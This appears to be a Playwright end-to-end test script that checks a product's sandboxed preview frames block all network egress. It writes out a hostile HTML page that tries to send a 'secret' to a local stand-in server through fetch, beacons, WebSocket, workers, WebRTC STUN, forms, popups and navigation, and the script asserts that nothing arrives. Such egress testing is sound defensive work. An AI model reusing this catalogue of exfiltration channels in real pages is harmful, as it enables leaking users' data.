// p3.5.8: agent-made pages reach no internet, in a real browser. A hostile page tries every way out
// it can (fetch, beacons, pictures, styles, fonts, scripts, WebSocket, EventSource, workers,
// prefetch and preconnect, forms, popups, top and self navigation, a meta refresh, a nested frame,
// WebRTC); a "server outside" listens and must hear nothing. A plain single-file page with inline
// script and style, data: and blob: pictures and its own JSON must keep working.
// 3.5.10: WebRTC too. Hostile pages try every way to a peer connection (webrtc-hostile.mjs: the
// page's first script, deleting and redefining globals, about:blank children, srcdoc written in
// every way, javascript:, data: and blob: frames, a worker, document.open, an SVG file with a
// script, a frameset); the STUN listener must hear nothing, and a page framing its own page works.
// Usage: node demo-server.mjs 4795, then
//        [CHROMIUM=/path/to/chrome] node preview-net-e2e.mjs <url> <token> <outdir> [boardDir]
// (boardDir: the demo's boards/0a1b2c3d4e5f, to try the same page as a board). Exits 1 on a failure.
import { createSocket } from "node:dgram";
import { mkdir, writeFile as writeLocal } from "node:fs/promises";
import { createServer } from "node:http";
import { join } from "node:path";
import { chromium } from "playwright-core";
import {
  CHILD_WAYS,
  webrtcDocWrite,
  webrtcFrameset,
  webrtcHostile,
  webrtcSvg,
} from "./webrtc-hostile.mjs";

const [url, token, out, boardDir] = process.argv.slice(2);
await mkdir(out, { recursive: true });
const auth = { authorization: `Bearer ${token}`, "content-type": "application/json" };
const api = async (method, path, body) => {
  const r = await fetch(`${url}${path}`, {
    method,
    headers: auth,
    ...(body && { body: JSON.stringify(body) }),
  });
  return { status: r.status, body: await r.json().catch(() => null) };
};

// The "internet": every request, upgrade or connection it gets is a leak.
const heard = [];
const outside = createServer((req, res) => {
  heard.push(`${req.method} ${req.url}`);
  res.writeHead(200, { "access-control-allow-origin": "*", "content-type": "text/plain" });
  res.end("x");
});
outside.on("upgrade", (req, socket) => {
  heard.push(`UPGRADE ${req.url}`);
  socket.destroy();
});
await new Promise((r) => outside.listen(0, "127.0.0.1", r));
const ext = `http://localhost:${outside.address().port}`;
// Preconnect opens a connection without a request: a server of its own counts connections.
let preconnects = 0;
const pre = createServer((_q, s) => s.end());
pre.on("connection", () => preconnects++);
await new Promise((r) => pre.listen(0, "127.0.0.1", r));
const preUrl = `http://localhost:${pre.address().port}`;
// WebRTC: a STUN server outside would get a binding request.
const stun = createSocket("udp4");
const stunHeard = [];
stun.on("message", (_m, from) => stunHeard.push(`${from.address}:${from.port}`));
await new Promise((r) => stun.bind(0, "127.0.0.1", r));
const stunPort = stun.address().port;

const evil = `<!doctype html><html><head><meta charset="utf-8">
<link rel="prefetch" href="${ext}/prefetch"><link rel="preload" as="fetch" href="${ext}/preload">
<link rel="preconnect" href="${preUrl}"><link rel="dns-prefetch" href="//leak.example.invalid">
<link rel="stylesheet" href="${ext}/sheet.css"><link rel="icon" href="${ext}/icon">
<style>@import url("${ext}/import.css");@font-face{font-family:x;src:url("${ext}/font")}body{font-family:x;background:url("${ext}/bg")}</style>
<script src="${ext}/script.js"></script>
</head><body><h1>evil</h1>
<img src="${ext}/img"><video src="${ext}/video" autoplay muted></video><audio src="${ext}/audio" autoplay></audio>
<object data="${ext}/object"></object><embed src="${ext}/embed">
<iframe src="${ext}/frame"></iframe><svg><image href="${ext}/svgimage"/></svg>
<form id="f" method="post" action="${ext}/form"><input name="a" value="secret"></form>
<a id="blank" href="${ext}/blank" target="_blank">a link that opens a window</a>
<a id="out" href="${ext}/link">a link that leaves</a>
<script>
const E=${JSON.stringify(ext)}, r={};
const done=(k,v)=>{r[k]=v};
(async()=>{
  try{await fetch(E+"/fetch",{method:"POST",body:"secret",mode:"no-cors"});done("fetch","SENT")}catch(e){done("fetch","blocked")}
  try{done("beacon",navigator.sendBeacon(E+"/beacon","secret")?"SENT":"blocked")}catch(e){done("beacon","blocked")}
  try{const x=new XMLHttpRequest();x.open("GET",E+"/xhr");x.send()}catch(e){}
  try{const w=new WebSocket(E.replace("http","ws")+"/ws");w.onopen=()=>done("ws","OPEN");w.onerror=()=>done("ws","blocked")}catch(e){done("ws","blocked")}
  try{const s=new EventSource(E+"/sse");s.onerror=()=>done("sse","blocked")}catch(e){done("sse","blocked")}
  new Image().src=E+"/img2";
  try{await import(E+"/module.js")}catch(e){}
  try{new Worker(URL.createObjectURL(new Blob(["fetch("+JSON.stringify(E+"/worker")+").catch(()=>{})"],{type:"text/javascript"})))}catch(e){}
  try{
    const pc=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.1:${stunPort}"}]});
    pc.createDataChannel("x");await pc.setLocalDescription(await pc.createOffer());done("webrtc","made");
  }catch(e){done("webrtc","blocked: "+e.name)}
  await new Promise(ok=>setTimeout(ok,1500));
  // Then the ways that take the frame itself away: popups, the top, a form.
  try{const w=window.open(E+"/open");done("open",w?"OPENED":"blocked")}catch(e){done("open","blocked")}
  try{const f=document.createElement("iframe");document.body.append(f);const w=f.contentWindow.open(E+"/open2");done("open2",w?"OPENED":"blocked")}catch(e){done("open2","blocked")}
  try{top.location.href=E+"/top";done("top","tried")}catch(e){done("top","blocked")}
  parent.postMessage({evil:r},"*");
  setTimeout(()=>{try{document.getElementById("f").submit()}catch(e){}},300);
})();
</script></body></html>`;

const good = `<!doctype html><html><head><meta charset="utf-8"><title>Good</title>
<style>body{font-family:system-ui;background:#f6f1ea;color:#2b0f12;padding:24px}.ok{color:#1a7f37}</style></head>
<body><h1>A single-file page</h1><p id="s">waiting</p>
<img id="d" alt="data" width="40" height="40" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40'%3E%3Crect width='40' height='40' fill='%23e0482e'/%3E%3C/svg%3E">
<img id="b" alt="blob" width="40" height="40"><canvas id="c" width="60" height="40"></canvas>
<a id="docs" href="https://developer.mozilla.org/" target="_blank">MDN</a> <a id="out" href="https://example.org/">example.org</a>
<script>
(async()=>{
  const r={inline:true};
  const b=new Blob(["<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'><circle cx='20' cy='20' r='18' fill='#2b6cb0'/></svg>"],{type:"image/svg+xml"});
  const bi=document.getElementById("b");
  await new Promise(ok=>{bi.onload=ok;bi.onerror=ok;bi.src=URL.createObjectURL(b)});
  r.blobImage=bi.naturalWidth===40;
  const di=document.getElementById("d");
  if(!di.complete)await new Promise(ok=>{di.onload=ok;di.onerror=ok});
  r.dataImage=di.naturalWidth===40;
  const x=document.getElementById("c").getContext("2d");x.fillStyle="#1a7f37";x.fillRect(0,0,60,40);r.canvas=true;
  try{r.ownJson=(await (await fetch("data.json")).json()).hello==="world"}catch(e){r.ownJson="error "+e}
  try{r.ownJsonAbsolute=(await (await fetch("/data.json")).json()).hello==="world"}catch(e){r.ownJsonAbsolute="error "+e}
  r.style=getComputedStyle(document.body).backgroundColor==="rgb(246, 241, 234)";
  document.getElementById("s").textContent="works: "+JSON.stringify(r);document.getElementById("s").className="ok";
  parent.postMessage({good:r},"*");
})();
</script></body></html>`;
const nav = `<!doctype html><p>leaving</p><script>setTimeout(()=>{location.href=${JSON.stringify(`${ext}/selfnav`)}},300)</script>`;
const meta = `<!doctype html><meta http-equiv="refresh" content="0;url=${ext}/meta"><p>refresh</p>`;

for (const [name, content] of [
  ["net/evil.html", evil],
  ["net/good.html", good],
  ["net/nav.html", nav],
  ["net/meta.html", meta],
  ["net/data.json", '{"hello":"world"}'],
  ["net/rtc.html", webrtcHostile(stunPort)],
  ["net/rtc-doc.html", webrtcDocWrite(stunPort)],
  ["net/rtc-frameset.html", webrtcFrameset(stunPort)],
  ["net/rtc.svg", webrtcSvg(stunPort)],
  [
    "net/framed.html",
    '<!doctype html><p>a page with its own page inside</p><iframe src="inner.html"></iframe><iframe srcdoc="<script>top.postMessage({framedSrcdoc:typeof document.body},\'*\')</script>"></iframe>',
  ],
  [
    "net/inner.html",
    "<!doctype html><p>inner</p><script>top.postMessage({innerPage:location.pathname.endsWith('inner.html')},'*')</script>",
  ],
]) {
  const w = await api("PUT", "/api/files/content", { scope: "platform", path: name, content });
  if (w.status !== 200) throw new Error(`write ${name}: ${w.status} ${JSON.stringify(w.body)}`);
}
const link = await api("POST", "/api/canvas/link", {
  kind: "file",
  scope: "platform",
  path: "net",
});
const base = link.body.url; // /preview/<token>/
let boardBase;
if (boardDir) {
  await writeLocal(join(boardDir, "evil.html"), evil);
  await writeLocal(join(boardDir, "nav.html"), nav);
  await writeLocal(join(boardDir, "rtc.html"), webrtcHostile(stunPort));
  for (const s of (await api("GET", "/api/sessions")).body) {
    const l = await api("GET", `/api/sessions/${s.id}/variants/0a1b2c3d4e5f/link`);
    if (l.status === 200) {
      boardBase = l.body.base;
      break;
    }
  }
}

let failed = false;
const check = (ok, what) => {
  console.log(`${ok ? "ok  " : "FAIL"} ${what}`);
  if (!ok) failed = true;
};
// FRAME_SANDBOX: the frame's sandbox (to compare with an older RedGiant, which allowed popups).
const FILES_SANDBOX =
  process.env.FRAME_SANDBOX ??
  "allow-scripts allow-forms allow-modals allow-downloads allow-pointer-lock";
const browser = await chromium.launch(
  process.env.CHROMIUM ? { executablePath: process.env.CHROMIUM } : {},
);
const context = await browser.newContext({
  viewport: { width: 1400, height: 900 },
  locale: "it-IT",
});
const popups = [];
const watchPopups = (p) =>
  p.on("popup", (w) => {
    const at = popups.length;
    popups.push(w.url());
    w.waitForLoadState().then(
      () => (popups[at] = w.url()),
      () => {},
    );
  });
const page = await context.newPage();
watchPopups(page);
const violations = [];
page.on("console", (m) => {
  if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text());
});
await page.goto(`${url}/#token=${token}`);
await page.evaluate(() => localStorage.setItem("rg.remoteNotice", "hidden"));
await page.goto(`${url}/#token=${token}`);
await page.waitForSelector(".bar");
await page.waitForTimeout(800);
const news = page.locator(".whats-new button.primary");
if (await news.count()) await news.first().click();

/** Says no to RedGiant's question, if there is one. */
const cancel = async () => {
  const no = page.locator("[role=dialog] button", { hasText: "Annulla" });
  if (await no.count()) await no.first().click();
};
/** A frame as the canvas and the boards make it, on RedGiant's own page. */
const frame = (id, src) =>
  page.evaluate(
    ([id, src, sandbox]) => {
      window.__got ??= {};
      window.__rtc ??= {};
      if (!window.__listening) {
        window.__listening = true;
        addEventListener("message", (e) => {
          if (e.data?.rtc) Object.assign(window.__rtc, e.data.rtc);
          else Object.assign(window.__got, e.data);
        });
      }
      const f = document.createElement("iframe");
      f.id = id;
      f.src = src;
      f.setAttribute("sandbox", sandbox);
      f.style.cssText =
        "position:fixed;z-index:9999;width:420px;height:300px;border:2px solid #e0482e;background:#fff";
      f.style.left = `${20 + 440 * document.querySelectorAll("iframe[id^=t-]").length}px`;
      f.style.top = "80px";
      document.body.append(f);
    },
    [id, src, FILES_SANDBOX],
  );

// 1. The canvas: a hostile page and a plain one.
await frame("t-evil", `${base}evil.html`);
await frame("t-good", `${base}good.html`);
await page.waitForTimeout(4000);
const got = await page.evaluate(() => window.__got);
console.log("evil page says:", JSON.stringify(got.evil));
console.log("good page says:", JSON.stringify(got.good));
check(page.url().startsWith(url), "top navigation blocked (RedGiant's page stays)");
for (const k of [
  "inline",
  "dataImage",
  "blobImage",
  "canvas",
  "ownJson",
  "ownJsonAbsolute",
  "style",
])
  check(got.good?.[k] === true, `legit page: ${k}`);
await page.screenshot({ path: join(out, "1-canvas-frames.png") });

// The hostile window.open was handed to RedGiant, which asks the person.
const asks = page.locator("[role=dialog]").filter({ hasText: "La pagina vuole aprire un link" });
check((await asks.count()) > 0, "window.open asks the person in RedGiant's own window");
await page.screenshot({ path: join(out, "2-window-open-asks.png") });
await cancel();
await page.waitForTimeout(300);
// A link that would open a window: handed to RedGiant too.
await page.frameLocator("#t-good").locator("#docs").click();
await page.waitForTimeout(600);
const asked = await page
  .locator("[role=dialog]")
  .filter({ hasText: "La pagina vuole aprire un link" })
  .count();
check(asked > 0, "a target=_blank link asks the person in RedGiant's own window");
await page.screenshot({ path: join(out, "2-link-asks.png") });
await cancel();
await page.frameLocator("#t-good").locator("#out").click();
await page.waitForTimeout(600);
check(
  (await page
    .locator("[role=dialog]")
    .filter({ hasText: "La pagina vuole aprire un link" })
    .count()) > 0,
  "a link leaving the preview asks too, and the frame stays",
);
await cancel();
check(
  (
    await page
      .frameLocator("#t-good")
      .locator("#s")
      .textContent({ timeout: 3000 })
      .catch(() => "")
  )?.includes("works"),
  "the page is still there after its links",
);

// 1b. WebRTC (3.5.10): the hostile pages; a page framing its own page still works.
await frame("t-rtc", `${base}rtc.html`);
await frame("t-rtc-doc", `${base}rtc-doc.html`);
await frame("t-rtc-frameset", `${base}rtc-frameset.html`);
await frame("t-rtc-svg", `${base}rtc.svg`);
await frame("t-framed", `${base}framed.html`);
await page.waitForTimeout(5000);
const rtcWays = await page.evaluate(() => window.__rtc);
const framed = await page.evaluate(() => window.__got);
for (const w of [
  ...CHILD_WAYS,
  "SVG file with a script",
  "frameset frame javascript:",
  "document.open + write of a new document",
])
  if (!(w in rtcWays)) rtcWays[w] = "(never ran)";
console.log("WebRTC, the ways tried:");
for (const [k, v] of Object.entries(rtcWays)) console.log(`     ${k}: ${v}`);
check(rtcWays.done === "yes", "the WebRTC page ran to its end");
check(
  !Object.values(rtcWays).some((v) => /MADE|natives seen/.test(String(v))),
  "no way made a peer connection",
);
// (A page framing another page of its own preview is refused by that page's frame-ancestors since
// 3.5.8: its parent is an opaque origin. Reported, not checked.)
console.log(
  `     a page framing its own page: ${framed.innerPage === true ? "the inner page runs" : "the inner page is refused (frame-ancestors)"}`,
);
check(
  framed.framedSrcdoc === "object",
  "a page with its own srcdoc frame: it runs (with the lockdown)",
);
await page.screenshot({ path: join(out, "1b-webrtc-frames.png") });
await page.evaluate(() => {
  for (const f of document.querySelectorAll("iframe[id^=t-rtc], iframe#t-framed")) f.remove();
});

// 2. Self navigation and a meta refresh: RedGiant's frame-src keeps the frame on its own site.
await frame("t-nav", `${base}nav.html`);
await frame("t-meta", `${base}meta.html`);
await page.waitForTimeout(2500);

// 3. The same pages as a board.
if (boardBase) {
  await page.evaluate(() => {
    for (const f of document.querySelectorAll("iframe[id^=t-]")) f.remove();
  });
  await frame("t-board", `${boardBase}evil.html`);
  await frame("t-board-nav", `${boardBase}nav.html`);
  await page.evaluate(() => {
    window.__rtc = {};
  });
  await frame("t-board-rtc", `${boardBase}rtc.html`);
  await page.waitForTimeout(4000);
  const boardRtc = await page.evaluate(() => window.__rtc);
  console.log("board WebRTC says:", JSON.stringify(boardRtc));
  check(boardRtc.done === "yes", "board: the WebRTC page ran to its end");
  check(
    !Object.values(boardRtc).some((v) => /MADE/.test(String(v))),
    "board: no way made a peer connection",
  );
  const b = await page.evaluate(() => window.__got.evil);
  console.log("board evil says:", JSON.stringify(b));
  await page.screenshot({ path: join(out, "3-board-frames.png") });
} else console.log("(no board directory given: board pages not tried in the browser)");

// 4. Opened on its own in a tab: RedGiant frames it, so it cannot leave either.
const tab = await context.newPage();
watchPopups(tab);
tab.on("console", (m) => {
  if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text());
});
await tab.goto(`${url}${base}good.html`);
await tab.waitForTimeout(1500);
check(
  (
    await tab
      .frameLocator("iframe")
      .locator("#s")
      .textContent({ timeout: 3000 })
      .catch(() => "")
  )?.includes('"ownJson":true'),
  "a page opened in a tab still works, framed",
);
await tab.screenshot({ path: join(out, "4-tab-good.png") });
await tab.goto(`${url}${base}nav.html`);
await tab.waitForTimeout(1500);
check(tab.url().startsWith(url), "a page opened in a tab cannot take the tab elsewhere");
await tab.goto(`${url}${base}evil.html`);
await tab.waitForTimeout(3500);
await tab.goto(`${url}${base}good.html`);
await tab.waitForTimeout(1500);
await tab
  .frameLocator("iframe")
  .locator("#docs")
  .click({ timeout: 3000 })
  .catch(() => {});
await tab.waitForTimeout(500);
check(await tab.locator("#rg-link").isVisible(), "in a tab, a link is shown to click, not opened");
await tab.screenshot({ path: join(out, "5-tab-evil-link.png") });

await page.waitForTimeout(1500);
console.log("outside heard:", heard.length ? heard.join(", ") : "nothing");
console.log("preconnect connections:", preconnects);
console.log("STUN heard:", stunHeard.length ? stunHeard.join(", ") : "nothing");
console.log("popups:", popups.length ? popups.join(", ") : "none");
const webrtc = stunHeard.length > 0;
check(
  heard.length === 0,
  "nothing reached the server outside (HTTP, WebSocket, forms, navigation)",
);
check(preconnects === 0, "no preconnect");
check(popups.length === 0, "no window opened");
// WebRTC has no CSP: the lockdown holds it (3.5.10). WEBRTC_WARN=1 only reports (an older RedGiant).
if (process.env.WEBRTC_WARN)
  console.log(
    `${webrtc ? "WARN" : "ok  "} WebRTC STUN ${webrtc ? "reached the outside" : "blocked"}`,
  );
else check(!webrtc, "WebRTC: the STUN server outside heard nothing");
await writeLocal(
  join(out, "result.json"),
  JSON.stringify(
    {
      heard,
      preconnects,
      stunHeard,
      stunSources: [...new Set(stunHeard)].length,
      rtcWays,
      popups,
      evil: got.evil,
      good: got.good,
      violations: violations.length,
    },
    null,
    2,
  ),
);
await writeLocal(join(out, "csp-violations.txt"), violations.join("\n"));
await browser.close();
outside.close();
pre.close();
stun.close();
process.exit(failed ? 1 : 0);
